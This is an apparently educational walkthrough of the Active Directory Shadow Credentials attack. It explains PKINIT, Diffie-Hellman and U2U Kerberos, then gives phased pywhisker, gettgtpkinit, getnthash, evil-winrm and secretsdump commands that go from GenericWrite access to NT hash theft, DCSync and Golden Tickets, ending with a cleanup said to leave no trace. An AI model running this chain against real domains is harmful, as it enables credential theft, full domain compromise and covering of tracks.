Building Block 1 · Asymmetric Encryption
🔑
Public Key & Private Key
foundation of PKINIT

Two mathematically linked keys. What one encrypts, only the other can decrypt. They are born together as a pair but work in opposite directions.

rule of encryption
PUBLIC KEY   → share everywhere
PRIVATE KEY  → NEVER leave your machine

encrypt with PUBLIC KEY
  → only PRIVATE KEY can decrypt

sign with PRIVATE KEY
  → anyone with PUBLIC KEY verifies
why signing matters here
In Shadow Credentials:

You sign your AS-REQ
with your PRIVATE KEY

The DC verifies that
signature using the
PUBLIC KEY you planted
in msDS-KeyCredentialLink

Match = identity proven ✅
Analogy: The public key is a padlock you hand out to the world. The private key is the only key that opens it. Anyone can lock a box shut for you — only you can open it.
Building Block 2 · Diffie-Hellman Key Exchange
⇌
Deriving a Shared Secret Without Sending It
used in PKINIT to create the session key

Problem: You and the DC need the same secret key to encrypt your conversation — but an attacker is watching the network. If you send the key, they steal it. Diffie-Hellman solves this with math: both sides compute the same secret independently.

the exchange — step by step
Both agree on public numbers g=5, p=23  (everyone can know these, not secret)

  You                                        DC
   │                                            │
   │  pick secret  a = 6  (never shared)        │  pick secret  b = 15 (never shared)
   │  compute  A = 5^6 mod 23 = 8              │  compute  B = 5^15 mod 23 = 19
   │                                            │
   │ ──── send A = 8  (public, anyone sees) ───►│
   │ ◄─── send B = 19 (public, anyone sees) ───│
   │                                            │
   │  compute: 19^6  mod 23 = 2              │  compute: 8^15 mod 23 = 2
   │                                            │
   │          SHARED SECRET = 2               │
   │          ↓                                 │
   │          SESSION KEY derived from this     │
   │                                            │
   Attacker captured 8 and 19 — cannot compute 2 without the private a or b
Why this matters in the attack
After PKINIT, both you and the DC independently arrive at the same session key. This key is used to encrypt the AS-REP — and later in step 3 to decrypt the PAC and extract the NTLM hash.
Analogy: You and DC both start with a white base paint. You each add your own secret colour privately. Then you swap the mixed results and each add your secret again. Both end up with the same final colour — but anyone watching only ever saw the intermediate swap.

Core Concept · PKINIT — Certificate-Based Kerberos
🪪
PKINIT — Same Kerberos, Different Proof
public key cryptography for initial authentication

PKINIT is Kerberos with one substitution: instead of proving identity with an NTLM hash, you prove it with a private key + certificate. Used by smart cards and Windows Hello.

normal kerberos
Proof of identity:
  encrypted timestamp
  using NTLM hash

DC verifies:
  decrypts with NTLM hash
  stored in AD
pkinit (certificate)
Proof of identity:
  signature made with
  your PRIVATE KEY

DC verifies:
  checks PUBLIC KEY in
  msDS-KeyCredentialLink
pkinit full flow (using building blocks 1 + 2)
You                                                DC
  │                                                    │
  │  1. open .pfx → get private key + certificate      │
  │  2. generate fresh DH key pair  ← building block 2 │
  │                                                    │
  │  3. build AS-REQ:                                  │
  │       ├── certificate  (holds public key)          │
  │       ├── DH public value                          │
  │       └── signature (signed with private key)      │
  │ ──────────────────────────────────────────────── ► │
  │                                                    │
  │                    4. DC finds target's msDS-KeyCredentialLink
  │                       verifies signature with public key there ✅
  │                                                    │
  │                    5. DC generates its own DH pair
  │                    6. Both compute SHARED SECRET  ← never sent!
  │                    7. Both derive same SESSION KEY from secret
  │                                                    │
  │  8. DC encrypts AS-REP with session key           │
  │     sends TGT + DH public value                 │
  │ ◄─────────────────────────────────────────────── │
  │                                                    │
  │  9. You compute same SESSION KEY (DH math)         │
  │ 10. Decrypt AS-REP → extract TGT                 │
  │     SAVE the session key — needed for step 3!     │
The key insight
The private key from building block 1 is only used to sign the request (prove identity). The Diffie-Hellman from building block 2 is what creates the session key. The session key is what unlocks the PAC in step 3.
msDS-KeyCredentialLink — the attribute that makes it all possible
  Normal PKINIT:
    User has a smart card → cert enrolled by domain CA
    DC admin writes the cert's public key → msDS-KeyCredentialLink

  Shadow Credentials:
    Attacker has GenericWrite on target object
    Attacker writes THEIR OWN public key → msDS-KeyCredentialLink
    DC can't tell the difference — it trusts whatever is stored there

  This one attribute is the entire attack surface

Phase 0 · Recon
Find GenericWrite over a target account
You need write access to the target's AD object — specifically to msDS-KeyCredentialLink. Common misconfigurations: helpdesk accounts with GenericWrite over all users, or GenericAll on privileged accounts.
# BloodHound shows the write path visually
bloodhound-python -d domain.local -u lowUser -p Pass -c All

# Or PowerView to check manually
Get-DomainObjectAcl -Identity "targetAdmin" -ResolveGUIDs |
  Where-Object { $_.ActiveDirectoryRights -match "GenericWrite|GenericAll" }
You need
GenericWrite / GenericAll / WriteProperty on the target's msDS-KeyCredentialLink attribute.
1
Phase 1 · pyWhisker — Plant your key
Generate RSA pair → write public key into AD
pyWhisker generates a fresh RSA key pair (building block 1). The public key is written into the target's msDS-KeyCredentialLink via LDAP. You get a .pfx file containing both keys + a password.
pywhisker.py -d "domain.local" -u "controlledUser" -p "OurPass" \
             --target "targetAccount" --action add

Output:
[+] KeyCredential added to msDS-KeyCredentialLink ✅
[i] DeviceID: abc-1234-xyz  ← save this for cleanup later
[i] Saved PFX: abc123.pfx
[i] PFX password: R@nd0mP4ss
In AD now
targetAccount's msDS-KeyCredentialLink contains your public key. The DC will now trust it as belonging to the target.
2
Phase 2 · gettgtpkinit.py — Authenticate as target
PKINIT + Diffie-Hellman → TGT + session key
Uses your .pfx to do PKINIT (concept above). The DC finds your planted public key in msDS-KeyCredentialLink, verifies your signature, and issues a TGT for the target. DH exchange derives the session key — save it.
python3 gettgtpkinit.py -cert-pfx abc123.pfx \
                         -pfx-pass "R@nd0mP4ss" \
                         DOMAIN.LOCAL/targetAccount \
                         targetAccount.ccache

Uses: PKINIT flow + DH from the concepts above
Result:
  [+] targetAccount.ccache  ← TGT, you are now authenticated as target
  [i] AS-REP key: 4f3a9...   ← SESSION KEY — critical for step 3!
You now have
A TGT authenticated as the target. And the session key — which is the key to unlocking the PAC in the next step.
⚠ Critical Insight — Why You Can't Just Decrypt the TGT Directly Key to understanding U2U

You have the TGT and the session key — so why not just open the TGT and read the PAC? Because the TGT has two separate layers of encryption, and your session key only opens the outer one.

AS-REP structure you receive from the DC
Outer envelope
enc-part — encrypted with your session key ✓ you can decrypt this
Contains: a copy of the session key, timestamps, other metadata
Inner ticket
ticket.enc-part — encrypted with krbtgt's NT hash ✗ you cannot decrypt this
Contains: the PAC → which contains the NTLM hash 
Session key  →  decrypts outer envelope only          ✅
Session key  →  does NOT decrypt the inner ticket     ❌

Inner ticket  =  encrypted with  krbtgt NT hash
krbtgt hash   =  only the KDC knows this
→  You can NEVER directly open your own TGT
How U2U forces the KDC to be your middleman
You send
TGT + U2U flag
enc-tkt-in-skey bit set
──► KDC ◄──
KDC does
1. Decrypts TGT with krbtgt
2. Reads PAC from inside
3. Repackages it into a new ST
4. Encrypts ST with session key 
Result: you receive a Service Ticket (U2U ST) containing the PAC,
encrypted with the session key you already have

Decrypt ST with session key  →  PAC readable  →  NT hash extracted ✅

The KDC opens the krbtgt layer FOR you, then reseals it with your key.
Without this step the PAC is permanently locked behind krbtgt.
3
Phase 3 · getnthash.py — Extract the NTLM hash
U2U ticket → decrypt PAC → NTLM hash
Uses the TGT to request a special User-to-User (U2U) ticket — a ticket for the target, from themselves. The DC encrypts it with the session key (which you have). Inside is the PAC — which contains the NTLM hash.
python3 getnthash.py DOMAIN.LOCAL/targetAccount \
                     -key 4f3a9...  ← the session key from step 2

What happens inside:
  1. Send U2U TGS-REQ: "give me a ticket for MYSELF"
  2. DC encrypts it with session key  ← you can decrypt this!
  3. Decrypt → read PAC inside
  4. PAC contains → NT Hash: aad3b435b51404ee...

Why U2U?  Normal TGS tickets are encrypted with the SERVICE's key
          U2U tickets are encrypted with YOUR session key — so you can read them
You now have
The target's NTLM hash. No cracking. No wordlist. No GPU. The DC handed it to you because the PAC is a design feature of Windows — you just had the right key to read it.
4
Phase 4 · Pass-the-Hash — Full access
Authenticate anywhere using the hash
Windows auth protocols use the NTLM hash as the key. They never verify a human typed a password. If you have the hash, you are the user as far as Windows is concerned.
# Shell as the target
evil-winrm -i 10.10.10.1 -u targetAccount -H aad3b435b51404ee...

# If target is Domain Admin → dump ALL domain hashes (DCSync)
secretsdump.py -hashes :aad3b435b51404ee... DOMAIN/targetAccount@DC_IP

# → dumps krbtgt hash → Golden Ticket → own domain forever
Impact if target is Domain Admin
Full domain compromise. Every account, every machine, every secret. Including the krbtgt hash for Golden Tickets that survive password resets.
5
Phase 5 · Cleanup
Remove your key from msDS-KeyCredentialLink
Delete the planted KeyCredential using the DeviceID from step 1. No trace remains. The NTLM hash you extracted stays valid until the target changes their password.
pywhisker.py -d "domain.local" -u "controlledUser" -p "OurPass" \
             --target "targetAccount" --action remove \
             --device-id abc-1234-xyz

# msDS-KeyCredentialLink is back to its original state
# No evidence of the shadow credential remains in AD
